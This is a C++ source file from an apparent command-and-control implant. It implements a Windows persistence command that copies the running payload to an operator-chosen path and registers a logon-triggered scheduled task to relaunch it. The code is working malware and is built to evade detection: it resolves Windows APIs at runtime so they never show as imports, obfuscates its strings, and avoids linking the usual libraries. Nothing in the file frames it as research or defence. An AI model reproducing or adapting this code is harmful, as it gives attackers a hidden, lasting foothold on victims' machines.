// ========================================== { START OF FILE } ========================================== //
#ifdef _WIN32

#include <Windows.h>
#include <mstask.h>

#include <algorithm>
#include <cstdint>
#include <memory>
#include <string>
#include <utility>
#include <vector>

#include "agent/commands/exec/wintask.h"
#include "agent/util/api_resolver.h"
#include "agent/util/strings.h"
#include "xorstr/xorstr.hpp"

// Reference: gred's Windows task command on clean/test (4dc40d0, "feat: Windows task command
// support"): Agent::DropFileToDiskW + Agent::CreateWindowsTaskW, and the WIN_TASK case in
// TaskQueueManager.cpp. This tree keeps the technique and applies its own rules:
//   - ole32 is resolved by hash, so CoInitializeEx / CoCreateInstance / CoUninitialize are never
//     static imports (.pi/notes/agent-development.md);
//   - the Task Scheduler GUIDs are defined locally, so mstask.h's DEFINE_GUID declarations are
//     never referenced and libuuid is not linked;
//   - the legacy `goto` cleanup became RAII and early returns (AGENTS.md);
//   - every failure names the step and the HRESULT/GetLastError instead of reporting success.
//
// Known limitation, carried from the reference: TASK_FLAG_RUN_ONLY_IF_LOGGED_ON means the task only
// starts when the account has an interactive session, so a standard user's task does not run
// without a desktop session (.pi/notes/live-debugging.md). The task is still registered, which is
// what persistence needs, and the success text says exactly that.

namespace agent::commands::exec {

    namespace {

        // Task Scheduler 1.0 identifiers. mstask.h declares these with DEFINE_GUID, which only
        // defines them when INITGUID is set; otherwise it is an unresolved extern that needs
        // libuuid. Defining the values here keeps the link self-contained.
        constexpr GUID k_clsid_task_scheduler = {.Data1 = 0x148BD52A,
                                                 .Data2 = 0xA2AB,
                                                 .Data3 = 0x11CE,
                                                 .Data4 = {0xB1, 0x1F, 0x00, 0xAA, 0x00, 0x53, 0x05, 0x03}};
        constexpr GUID k_iid_task_scheduler = {.Data1 = 0x148BD527,
                                               .Data2 = 0xA2AB,
                                               .Data3 = 0x11CE,
                                               .Data4 = {0xB1, 0x1F, 0x00, 0xAA, 0x00, 0x53, 0x05, 0x03}};
        constexpr GUID k_clsid_task = {.Data1 = 0x148BD520,
                                       .Data2 = 0xA2AB,
                                       .Data3 = 0x11CE,
                                       .Data4 = {0xB1, 0x1F, 0x00, 0xAA, 0x00, 0x53, 0x05, 0x03}};
        constexpr GUID k_iid_task = {.Data1 = 0x148BD524,
                                     .Data2 = 0xA2AB,
                                     .Data3 = 0x11CE,
                                     .Data4 = {0xB1, 0x1F, 0x00, 0xAA, 0x00, 0x53, 0x05, 0x03}};
        constexpr GUID k_iid_persist_file = {.Data1 = 0x0000010b,
                                             .Data2 = 0x0000,
                                             .Data3 = 0x0000,
                                             .Data4 = {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

        // Copy in bounded chunks so a 32-bit DWORD cast can never truncate a length.
        constexpr std::size_t kCopyChunk = 1U << 20;

        [[nodiscard]] std::string ToHex(const std::uint32_t value) {
            std::string hex(8, '0');
            for (std::size_t index = 0; index < hex.size(); ++index) {
                const auto digit = static_cast<std::uint32_t>((value >> ((hex.size() - 1 - index) * 4)) & 0xFU);
                hex[index] = static_cast<char>(digit < 10 ? ('0' + digit) : ('A' + digit - 10));
            }
            return hex;
        }

        [[nodiscard]] CommandResult HresultFailure(const char* stage, HRESULT hr) {
            return CommandResult::Error(xorstr_("Persistence failed: ") + std::string{stage} +
                                        xorstr_(" returned HRESULT 0x") + ToHex(static_cast<std::uint32_t>(hr)));
        }

        [[nodiscard]] CommandResult Win32Failure(const char* stage, DWORD error) {
            return CommandResult::Error(xorstr_("Persistence failed: ") + std::string{stage} +
                                        xorstr_(" returned GetLastError ") + std::to_string(error));
        }

        /// Closes a file handle at scope exit. The resolver is injected so the command emits no
        /// static import for CloseHandle.
        class FileHandle {
           public:
            FileHandle(HANDLE handle, decltype(&CloseHandle) close) : handle_(handle), close_(close) {}
            ~FileHandle() {
                if (close_ != nullptr && handle_ != INVALID_HANDLE_VALUE && handle_ != nullptr) {
                    close_(handle_);
                }
            }
            FileHandle(const FileHandle&) = delete;
            FileHandle& operator=(const FileHandle&) = delete;
            FileHandle(FileHandle&&) = delete;
            FileHandle& operator=(FileHandle&&) = delete;

            [[nodiscard]] HANDLE get() const { return handle_; }
            [[nodiscard]] bool valid() const { return handle_ != INVALID_HANDLE_VALUE && handle_ != nullptr; }

           private:
            HANDLE handle_ = INVALID_HANDLE_VALUE;
            decltype(&CloseHandle) close_ = nullptr;
        };

        /// Releases a COM interface at scope exit. Release is a vtable call, so no import is emitted.
        template <typename Interface>
        struct ComRelease {
            void operator()(Interface* pointer) const {
                if (pointer != nullptr) {
                    pointer->Release();
                }
            }
        };

        template <typename Interface>
        using ComPtr = std::unique_ptr<Interface, ComRelease<Interface>>;

        /// Calls CoUninitialize at scope exit, but only after a successful CoInitializeEx.
        class ComScope {
           public:
            explicit ComScope(decltype(&CoUninitialize) uninitialize) : uninitialize_(uninitialize) {}
            ~ComScope() {
                if (uninitialize_ != nullptr) {
                    uninitialize_();
                }
            }
            ComScope(const ComScope&) = delete;
            ComScope& operator=(const ComScope&) = delete;
            ComScope(ComScope&&) = delete;
            ComScope& operator=(ComScope&&) = delete;

           private:
            decltype(&CoUninitialize) uninitialize_ = nullptr;
        };

        /// Reads the current module's path with the two-call GetModuleFileNameW pattern.
        [[nodiscard]] bool ReadModulePath(decltype(&GetModuleFileNameW) get_module_file_name, std::wstring& out,
                                          DWORD& error) {
            // Win32 caps a path at 32767 wide characters, so one maximum-sized buffer is enough.
            std::vector<wchar_t> buffer(0x8000);
            const DWORD length = get_module_file_name(nullptr, buffer.data(), static_cast<DWORD>(buffer.size()));
            if (length == 0) {
                error = GetLastError();
                return false;
            }
            if (length >= buffer.size()) {
                error = ERROR_INSUFFICIENT_BUFFER;
                return false;
            }
            out.assign(buffer.data(), length);
            return true;
        }

        /// Copies the running payload to `destination`. Read and Write are looped: a single call may
        /// return fewer bytes than asked for, which the legacy port treated as success.
        [[nodiscard]] CommandResult DropPayloadAt(const std::wstring& destination) {
            const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
            if (kernel32 == nullptr) {
                return CommandResult::Error(xorstr_("Persistence failed: kernel32.dll is unavailable"));
            }
            const auto get_module_file_name =
                agent::util::resolve_api<decltype(&GetModuleFileNameW)>(kernel32, xorstr_("GetModuleFileNameW"));
            const auto create_file = agent::util::resolve_api<decltype(&CreateFileW)>(kernel32, xorstr_("CreateFileW"));
            const auto read_file = agent::util::resolve_api<decltype(&ReadFile)>(kernel32, xorstr_("ReadFile"));
            const auto write_file = agent::util::resolve_api<decltype(&WriteFile)>(kernel32, xorstr_("WriteFile"));
            const auto get_file_size =
                agent::util::resolve_api<decltype(&GetFileSizeEx)>(kernel32, xorstr_("GetFileSizeEx"));
            const auto close_handle =
                agent::util::resolve_api<decltype(&CloseHandle)>(kernel32, xorstr_("CloseHandle"));
            if (get_module_file_name == nullptr || create_file == nullptr || read_file == nullptr ||
                write_file == nullptr || get_file_size == nullptr || close_handle == nullptr) {
                return CommandResult::Error(xorstr_("Persistence failed: file APIs could not be resolved"));
            }

            std::wstring module_path;
            DWORD error = 0;
            if (!ReadModulePath(get_module_file_name, module_path, error)) {
                return Win32Failure(xorstr_("GetModuleFileNameW"), error);
            }

            FileHandle source{create_file(module_path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                          nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr),
                              close_handle};
            if (!source.valid()) {
                return Win32Failure(xorstr_("CreateFileW (source payload)"), GetLastError());
            }

            LARGE_INTEGER size{};
            if (get_file_size(source.get(), &size) == FALSE) {
                return Win32Failure(xorstr_("GetFileSizeEx"), GetLastError());
            }
            if (size.QuadPart <= 0) {
                return CommandResult::Error(xorstr_("Persistence failed: the payload file is empty"));
            }

            std::vector<BYTE> contents(static_cast<std::size_t>(size.QuadPart));
            std::size_t total_read = 0;
            while (total_read < contents.size()) {
                const DWORD chunk = static_cast<DWORD>(std::min(kCopyChunk, contents.size() - total_read));
                DWORD read_now = 0;
                if (read_file(source.get(), contents.data() + total_read, chunk, &read_now, nullptr) == FALSE) {
                    return Win32Failure(xorstr_("ReadFile"), GetLastError());
                }
                if (read_now == 0) {
                    return CommandResult::Error(xorstr_("Persistence failed: the payload file shrank while reading"));
                }
                total_read += read_now;
            }

            FileHandle destination_handle{create_file(destination.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr),
                                          close_handle};
            if (!destination_handle.valid()) {
                return Win32Failure(xorstr_("CreateFileW (destination)"), GetLastError());
            }

            std::size_t total_written = 0;
            while (total_written < contents.size()) {
                const DWORD chunk = static_cast<DWORD>(std::min(kCopyChunk, contents.size() - total_written));
                DWORD written_now = 0;
                if (write_file(destination_handle.get(), contents.data() + total_written, chunk, &written_now,
                               nullptr) == FALSE) {
                    return Win32Failure(xorstr_("WriteFile"), GetLastError());
                }
                if (written_now == 0) {
                    return CommandResult::Error(xorstr_("Persistence failed: WriteFile wrote no bytes"));
                }
                total_written += written_now;
            }

            return CommandResult::Ok(xorstr_("Payload dropped at ") + agent::util::ToUtf8(destination));
        }

        /// Registers the dropped payload as a logon-triggered task via COM Task Scheduler 1.0.
        [[nodiscard]] CommandResult RegisterLogonTask(const models::CheckinResponse& task) {
            const std::wstring application = agent::util::ToWide(task.file_path);
            const std::wstring task_name = agent::util::ToWide(task.task_name);
            const std::wstring account = agent::util::ToWide(task.username);

            const HMODULE ole32 = agent::util::get_module(xorstr_("ole32.dll"));
            if (ole32 == nullptr) {
                return CommandResult::Error(xorstr_("Persistence failed: ole32.dll is unavailable"));
            }
            const auto co_initialize =
                agent::util::resolve_api<decltype(&CoInitializeEx)>(ole32, xorstr_("CoInitializeEx"));
            const auto co_create_instance =
                agent::util::resolve_api<decltype(&CoCreateInstance)>(ole32, xorstr_("CoCreateInstance"));
            const auto co_uninitialize =
                agent::util::resolve_api<decltype(&CoUninitialize)>(ole32, xorstr_("CoUninitialize"));
            if (co_initialize == nullptr || co_create_instance == nullptr || co_uninitialize == nullptr) {
                return CommandResult::Error(xorstr_("Persistence failed: ole32 entry points could not be resolved"));
            }

            const HRESULT initialize = co_initialize(nullptr, COINIT_MULTITHREADED);
            if (FAILED(initialize)) {
                return HresultFailure(xorstr_("CoInitializeEx"), initialize);
            }
            const ComScope com_scope{co_uninitialize};

            ITaskScheduler* raw_scheduler = nullptr;
            const HRESULT created = co_create_instance(k_clsid_task_scheduler, nullptr, CLSCTX_INPROC_SERVER,
                                                       k_iid_task_scheduler, reinterpret_cast<void**>(&raw_scheduler));
            if (FAILED(created) || raw_scheduler == nullptr) {
                return HresultFailure(xorstr_("CoCreateInstance(ITaskScheduler)"), created);
            }
            const ComPtr<ITaskScheduler> scheduler{raw_scheduler};

            ITask* raw_task = nullptr;
            const HRESULT item_created = scheduler->NewWorkItem(task_name.c_str(), k_clsid_task, k_iid_task,
                                                                reinterpret_cast<IUnknown**>(&raw_task));
            if (FAILED(item_created) || raw_task == nullptr) {
                return HresultFailure(xorstr_("NewWorkItem"), item_created);
            }
            const ComPtr<ITask> work_item{raw_task};

            HRESULT hr = work_item->SetApplicationName(application.c_str());
            if (FAILED(hr)) {
                return HresultFailure(xorstr_("SetApplicationName"), hr);
            }

            // Username is optional: empty means the running user, and Task Scheduler rejects an
            // empty account name, so leave its default in place instead of calling with "".
            if (!account.empty()) {
                hr = work_item->SetAccountInformation(account.c_str(), nullptr);
                if (FAILED(hr)) {
                    return HresultFailure(xorstr_("SetAccountInformation"), hr);
                }
            }

            WORD trigger_index = 0;
            ITaskTrigger* raw_trigger = nullptr;
            hr = work_item->CreateTrigger(&trigger_index, &raw_trigger);
            if (FAILED(hr) || raw_trigger == nullptr) {
                return HresultFailure(xorstr_("CreateTrigger"), hr);
            }
            const ComPtr<ITaskTrigger> trigger{raw_trigger};

            TASK_TRIGGER trigger_data{};
            trigger_data.cbTriggerSize = static_cast<WORD>(sizeof(TASK_TRIGGER));
            trigger_data.wBeginDay = 1;
            trigger_data.wBeginMonth = 1;
            trigger_data.wBeginYear = 1999;
            trigger_data.TriggerType = TASK_EVENT_TRIGGER_AT_LOGON;
            hr = trigger->SetTrigger(&trigger_data);
            if (FAILED(hr)) {
                return HresultFailure(xorstr_("SetTrigger"), hr);
            }

            DWORD flags = 0;
            hr = work_item->GetFlags(&flags);
            if (FAILED(hr)) {
                return HresultFailure(xorstr_("GetFlags"), hr);
            }
            flags |= TASK_FLAG_RUN_ONLY_IF_LOGGED_ON;
            hr = work_item->SetFlags(flags);
            if (FAILED(hr)) {
                return HresultFailure(xorstr_("SetFlags"), hr);
            }

            IPersistFile* raw_persist = nullptr;
            hr = work_item->QueryInterface(k_iid_persist_file, reinterpret_cast<void**>(&raw_persist));
            if (FAILED(hr) || raw_persist == nullptr) {
                return HresultFailure(xorstr_("QueryInterface(IPersistFile)"), hr);
            }
            const ComPtr<IPersistFile> persist{raw_persist};

            hr = persist->Save(nullptr, TRUE);
            if (FAILED(hr)) {
                // The work item exists only in memory until Save persists it; drop it so a failed
                // save leaves no half-created task behind (the legacy cleanup did the same).
                scheduler->Delete(task_name.c_str());
                return HresultFailure(xorstr_("IPersistFile::Save"), hr);
            }

            // Save is the point at which the task exists. Run() starts it now; a failure there (no
            // interactive session, a policy block) does not undo the registration, so it is
            // reported in the output rather than flipping the persistence result to an error.
            const HRESULT started = work_item->Run();
            std::string detail = xorstr_("Registered scheduled task '") + task.task_name + "' at " + task.file_path;
            if (FAILED(started)) {
                detail += xorstr_("; the immediate start failed (HRESULT 0x") +
                          ToHex(static_cast<std::uint32_t>(started)) +
                          xorstr_(") - the task is registered and will start at logon");
            } else {
                detail += xorstr_("; started now");
            }
            return CommandResult::Ok(std::move(detail));
        }

    }  // namespace

    CommandResult CreateWinTask(const models::CheckinResponse& task) {
        if (task.file_path.empty() || task.task_name.empty()) {
            // The dispatcher validates first; this keeps the command honest if called directly.
            return CommandResult::Error(xorstr_("Persistence failed: Path and TaskName are required"));
        }

        CommandResult dropped = DropPayloadAt(agent::util::ToWide(task.file_path));
        if (!dropped.success) {
            return dropped;
        }

        return RegisterLogonTask(task);
    }

}  // namespace agent::commands::exec

#endif  // _WIN32
// ========================================== { END OF FILE } ========================================== //
